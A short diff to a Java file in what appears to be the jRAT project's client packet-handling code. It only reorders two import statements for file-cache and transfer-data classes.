@@ -1,9 +1,9 @@
 package jrat.client.packets.incoming;
 
-import jrat.common.io.FileCache;
-import jrat.common.io.TransferData;
 import jrat.client.Connection;
 import jrat.client.packets.Temp;
+import jrat.common.io.FileCache;
+import jrat.common.io.TransferData;
 
 import java.io.File;
 
